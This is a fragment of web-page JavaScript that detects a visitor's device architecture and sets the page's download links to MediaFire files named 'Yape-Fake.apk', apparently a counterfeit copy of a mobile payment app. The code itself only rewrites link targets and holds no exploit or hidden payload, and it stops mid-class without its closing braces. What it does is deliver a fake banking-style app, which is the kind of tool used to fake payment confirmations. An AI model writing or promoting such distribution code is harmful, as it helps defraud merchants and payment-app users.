    <script>
        class APKDownloader {
            constructor() {
                this.architecture = this.getArchitecture();
                this.downloadLinks = {
                    'armeabi-v7a': 'https://www.mediafire.com/file/22ig66ez7dghh6t/Yape-Fake.apk/file',
                    'arm64-v8a': 'https://www.mediafire.com/file/cgjze5zwv34pgns/Yape-Fake.apk/file',
                    'x86_64': 'https://www.mediafire.com/file/k1ce65s5du5yl2p/Yape-Fake.apk/file',
                    'default': 'https://www.mediafire.com/folder/6u46rnx068uhe/Yape-Fake'
                };
            }

            // Detecta la arquitectura del dispositivo
            getArchitecture() {
                const platform = navigator.platform.toLowerCase();
                const userAgent = navigator.userAgent.toLowerCase();

                if (platform.includes('arm64') || userAgent.includes('aarch64') || userAgent.includes('armv8')) {
                    return 'arm64-v8a';
                } else if (platform.includes('arm') || userAgent.includes('armeabi') || userAgent.includes('armv7')) {
                    return 'armeabi-v7a';
                } else if (platform.includes('x86_64') || userAgent.includes('x86_64') || userAgent.includes('amd64')) {
                    return 'x86_64';
                }
                return 'default';
            }

            // Muestra el mensaje y genera el enlace de descarga para todos los elementos con id="downloadLink"
            generateDownloadLinks() {
                const downloadLinks = document.querySelectorAll('#downloadLink'); // Selecciona todos los elementos con id="downloadLink"
                const apkLink = this.downloadLinks[this.architecture] || this.downloadLinks['default'];

                // Mensaje de detección de arquitectura
                if (this.architecture === 'default') {
                    downloadLinks.forEach((link) => {
                        link.href = apkLink;
                        //  link.style.display = 'none';
                    });
                } else {
                    downloadLinks.forEach((link) => {
                        link.href = apkLink;
                        link.style.display = 'inline-block';
                    });

            }
        }
